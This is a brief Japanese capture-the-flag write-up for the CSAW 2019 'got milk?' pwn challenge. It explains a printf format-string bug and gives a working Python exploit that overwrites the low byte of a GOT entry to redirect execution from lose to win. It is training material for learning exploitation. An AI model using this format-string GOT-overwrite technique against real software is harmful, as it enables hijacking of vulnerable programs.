# [pwn 50pts] got milk? - CSAW CTF Qualification 2019
64ビットバイナリで、DEP以外無効です。
```
$ checksec -f gotmilk
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols     No       0               4       gotmilk
```

printfによるFSBがあり、その後にlibmylib.soのlose関数が呼ばれます。他にもwin関数があるので、これを呼び出せばOKです。loseとwinはアドレスが下位1バイトしか変わらないので、fsbでloseのGOTの下位1バイトをwinのものに書き換えればwinが呼び出せます。
```python
from ptrlib import *

elf = ELF("./gotmilk")
lib = ELF("./libmylib.so")
#sock = Process("./gotmilk", env={"LD_LIBRARY_PATH": "./"})
sock = Socket("pwn.chal.csaw.io", 1004)

payload = p32(elf.got("lose"))
payload += str2bytes('%{}c%7$hhn'.format(0x89 - 4))
sock.sendline(payload)

sock.interactive()
```

# 感想
簡単ですね。
